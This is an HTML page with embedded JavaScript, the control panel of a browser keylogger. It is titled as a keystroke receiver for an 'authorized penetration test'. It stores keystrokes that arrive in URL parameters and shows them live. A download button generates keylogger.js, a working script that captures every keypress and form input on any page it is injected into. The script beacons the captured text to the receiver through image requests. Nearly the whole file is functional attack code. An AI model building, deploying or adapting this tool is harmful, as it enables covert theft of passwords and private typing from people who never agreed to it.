<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Receiver</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        h1 {
            color: #fff;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-bottom: 5px;
            font-size: 22px;
        }
        .subtitle {
            color: #666;
            font-size: 13px;
            margin-bottom: 20px;
        }
        .status-bar {
            background: #111;
            border: 1px solid #333;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .status-bar .stat {
            color: #888;
            font-size: 13px;
        }
        .status-bar .stat span {
            color: #0f0;
            font-weight: bold;
        }
        .controls {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .controls button, .controls a {
            background: #111;
            border: 1px solid #0ff;
            color: #0ff;
            padding: 8px 18px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            border-radius: 3px;
            cursor: pointer;
            text-decoration: none;
            transition: 0.2s;
        }
        .controls button:hover, .controls a:hover {
            background: #0ff;
            color: #000;
        }
        .controls button.danger {
            border-color: #f44;
            color: #f44;
        }
        .controls button.danger:hover {
            background: #f44;
            color: #000;
        }
        .controls .download-btn {
            border-color: #0f0;
            color: #0f0;
        }
        .controls .download-btn:hover {
            background: #0f0;
            color: #000;
        }
        .entry {
            background: #111;
            border: 1px solid #222;
            border-left: 3px solid #0f0;
            padding: 14px 16px;
            margin-bottom: 12px;
            border-radius: 4px;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .entry .meta {
            color: #666;
            font-size: 11px;
            margin-bottom: 6px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 5px;
        }
        .entry .meta .url { color: #fa0; }
        .entry .keys {
            color: #0f0;
            font-size: 15px;
            word-break: break-all;
            line-height: 1.5;
            background: #0a0a0a;
            padding: 8px 10px;
            border-radius: 2px;
            border: 1px solid #1a1a1a;
        }
        .entry .keys .highlight {
            color: #ff0;
            background: #222;
            padding: 0 3px;
            border-radius: 2px;
        }
        .empty-state {
            color: #444;
            text-align: center;
            padding: 60px 20px;
            font-size: 16px;
        }
        .empty-state .icon { font-size: 48px; margin-bottom: 15px; }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #0f0;
            color: #000;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 13px;
            display: none;
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
            z-index: 999;
        }
        #live-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #0f0;
            margin-right: 6px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        @media (max-width: 600px) {
            body { padding: 10px; }
            .entry .meta { flex-direction: column; }
        }
    </style>
</head>
<body>

    <h1>⌨ Keystroke Receiver</h1>
    <p class="subtitle">Authorized Penetration Test — Internal Use Only</p>

    <div class="status-bar">
        <div class="stat">📦 Stored: <span id="entry-count">0</span> entries</div>
        <div class="stat">📋 Total keys: <span id="total-keys">0</span></div>
        <div class="stat"><span id="live-indicator"></span>Listening</div>
    </div>

    <div class="controls">
        <button onclick="loadEntries()">🔄 Refresh</button>
        <button id="auto-refresh-btn" onclick="toggleAutoRefresh()">⏸ Pause</button>
        <button class="danger" onclick="clearEntries()">🗑 Clear</button>
        <a href="#" onclick="exportLog()">📥 Export TXT</a>
        <!-- DOWNLOAD KEYLOGGER BUTTON - FIXED -->
        <button class="download-btn" onclick="downloadKeylogger()" style="border:1px solid #0f0;background:#111;color:#0f0;padding:8px 18px;font-family:'Courier New',monospace;font-size:13px;border-radius:3px;cursor:pointer;">⬇ Download keylogger.js</button>
    </div>

    <div id="entries-container">
        <div class="empty-state">
            <div class="icon">📡</div>
            Waiting for keystrokes...<br>
            <small style="color:#555;">Point your keylogger to this page's URL</small>
        </div>
    </div>

    <div id="toast" class="toast">✓ Done!</div>

    <script>
        // ============================================================
        //  STORAGE KEY
        // ============================================================
        const STORAGE_KEY = 'keylog_entries';

        // ============================================================
        //  CAPTURE INCOMING DATA (via URL parameters)
        // ============================================================
        function captureFromURL() {
            const params = new URLSearchParams(window.location.search);
            const keystrokes = params.get('k');
            const sourceUrl = params.get('u') || 'unknown';

            if (!keystrokes) return false;

            const entry = {
                id: Date.now() + '_' + Math.random().toString(36).slice(2, 6),
                timestamp: new Date().toISOString(),
                ip: 'captured via beacon',
                url: sourceUrl,
                userAgent: navigator.userAgent,
                keys: decodeURIComponent(keystrokes),
                receivedAt: new Date().toLocaleString()
            };

            const entries = getEntries();
            entries.unshift(entry);
            localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));

            if (window.history.replaceState) {
                window.history.replaceState({}, document.title, window.location.pathname);
            }

            return true;
        }

        function getEntries() {
            try {
                const data = localStorage.getItem(STORAGE_KEY);
                return data ? JSON.parse(data) : [];
            } catch (e) {
                return [];
            }
        }

        function renderEntries() {
            const entries = getEntries();
            const container = document.getElementById('entries-container');
            const countEl = document.getElementById('entry-count');
            const totalKeysEl = document.getElementById('total-keys');

            countEl.textContent = entries.length;
            totalKeysEl.textContent = entries.reduce((sum, e) => sum + e.keys.length, 0);

            if (entries.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="icon">📡</div>
                        Waiting for keystrokes...<br>
                        <small style="color:#555;">Point your keylogger to this page's URL</small>
                    </div>
                `;
                return;
            }

            let html = '';
            entries.forEach((entry, index) => {
                const time = new Date(entry.timestamp).toLocaleString();
                const keysDisplay = entry.keys
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/\n/g, '<span class="highlight">\\n</span><br>')
                    .replace(/\[ENTER\]/g, '<span class="highlight">[ENTER]</span><br>')
                    .replace(/\[TAB\]/g, '<span class="highlight">[TAB]</span>')
                    .replace(/\[BACKSPACE\]/g, '<span class="highlight">[BACKSPACE]</span>')
                    .replace(/\[SHIFT\]/g, '<span class="highlight">[SHIFT]</span>')
                    .replace(/\[CTRL\]/g, '<span class="highlight">[CTRL]</span>')
                    .replace(/\[ALT\]/g, '<span class="highlight">[ALT]</span>')
                    .replace(/\[ESC\]/g, '<span class="highlight">[ESC]</span>')
                    .replace(/\[DEL\]/g, '<span class="highlight">[DEL]</span>');

                html += `
                    <div class="entry">
                        <div class="meta">
                            <span>#${index + 1} — ${time}</span>
                            <span class="url">${escapeHtml(entry.url)}</span>
                        </div>
                        <div class="keys">${keysDisplay}</div>
                    </div>
                `;
            });

            container.innerHTML = html;
        }

        function escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        function loadEntries() { renderEntries(); }

        function clearEntries() {
            if (confirm('Delete all captured keystrokes?')) {
                localStorage.removeItem(STORAGE_KEY);
                renderEntries();
                showToast('🗑 Cleared');
            }
        }

        function exportLog() {
            const entries = getEntries();
            if (entries.length === 0) { alert('No entries to export.'); return; }

            let text = '═══════════════════════════════════════════════════════\n';
            text += '  KEYSTROKE LOG — Authorized Pentest\n';
            text += '  Exported: ' + new Date().toLocaleString() + '\n';
            text += '═══════════════════════════════════════════════════════\n\n';

            entries.forEach((entry, i) => {
                text += `--- Entry #${i + 1} ---\n`;
                text += `Time:    ${new Date(entry.timestamp).toLocaleString()}\n`;
                text += `URL:     ${entry.url}\n`;
                text += `UA:      ${entry.userAgent}\n`;
                text += `Keys:    ${entry.keys}\n\n`;
            });

            const blob = new Blob([text], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `keylog_${Date.now()}.txt`;
            a.click();
            URL.revokeObjectURL(url);
            showToast('📥 Exported');
        }

        // ============================================================
        //  ★ FIXED DOWNLOAD KEYLOGGER FUNCTION
        // ============================================================
        function downloadKeylogger() {
            // Auto-detect this page's URL (without query params)
            const thisUrl = window.location.protocol + '//' + window.location.host + window.location.pathname;
            const receiverUrl = thisUrl;

            // Build the keylogger JavaScript source code
            const keyloggerCode = `(function() {
    'use strict';
    const KEYLOGGER_URL = '${receiverUrl}';
    let buffer = '';
    let lastSent = Date.now();
    const FLUSH = 3000;
    const SPECIAL = {
        'Enter':     '[ENTER]\\n',
        'Tab':       '[TAB]',
        'Backspace': '[BACKSPACE]',
        'Shift':     '[SHIFT]',
        'Control':   '[CTRL]',
        'Alt':       '[ALT]',
        'CapsLock':  '[CAPSLOCK]',
        'Escape':    '[ESC]',
        'ArrowUp':   '[UP]',
        'ArrowDown': '[DOWN]',
        'ArrowLeft': '[LEFT]',
        'ArrowRight':'[RIGHT]',
        'Delete':    '[DEL]',
        'Home':      '[HOME]',
        'End':       '[END]',
        'PageUp':    '[PGUP]',
        'PageDown':  '[PGDN]',
        'Meta':      '[WIN]'
    };
    document.addEventListener('keydown', function(e) {
        var k = e.key;
        if (!k) return;
        if (SPECIAL[k]) { buffer += SPECIAL[k]; }
        else if (k.length === 1) { buffer += k; }
        if (Date.now() - lastSent >= FLUSH || k === 'Enter') { flush(); lastSent = Date.now(); }
    });
    document.addEventListener('input', function(e) {
        var t = e.target.tagName.toLowerCase();
        if (t === 'input' || t === 'textarea') {
            var v = e.target.value;
            if (v.length > 0) buffer += v.slice(-1);
        }
    });
    function flush() {
        if (!buffer.length) return;
        var d = buffer; buffer = '';
        var img = new Image();
        img.src = KEYLOGGER_URL + '?k=' + encodeURIComponent(d) + '&u=' + encodeURIComponent(window.location.href) + '&t=' + Date.now();
    }
    window.addEventListener('beforeunload', flush);
    console.log('[keylogger] loaded, sending to:', KEYLOGGER_URL);
})();`;

            // Create a Blob with the JavaScript code
            const blob = new Blob([keyloggerCode], { type: 'application/javascript;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'keylogger.js';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // Clean up the object URL after a short delay
            setTimeout(function() {
                URL.revokeObjectURL(url);
            }, 100);

            showToast('⬇ keylogger.js downloaded!');
        }

        // ============================================================
        //  TOAST
        // ============================================================
        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.style.display = 'block';
            clearTimeout(toast._hide);
            toast._hide = setTimeout(() => { toast.style.display = 'none'; }, 2000);
        }

        // ============================================================
        //  AUTO-REFRESH
        // ============================================================
        let autoRefreshInterval = null;
        let autoRefreshEnabled = true;

        function toggleAutoRefresh() {
            autoRefreshEnabled = !autoRefreshEnabled;
            const btn = document.getElementById('auto-refresh-btn');
            if (autoRefreshEnabled) {
                btn.textContent = '⏸ Pause';
                startAutoRefresh();
            } else {
                btn.textContent = '▶ Resume';
                stopAutoRefresh();
            }
        }

        function startAutoRefresh() {
            stopAutoRefresh();
            autoRefreshInterval = setInterval(() => { renderEntries(); }, 3000);
        }

        function stopAutoRefresh() {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
            }
        }

        // ============================================================
        //  INIT
        // ============================================================
        (function init() {
            const captured = captureFromURL();
            if (captured) { showToast('✓ Keystrokes captured!'); }
            renderEntries();
            startAutoRefresh();
            window.addEventListener('storage', function(e) {
                if (e.key === STORAGE_KEY) { renderEntries(); }
            });
        })();
    </script>

</body>
</html>
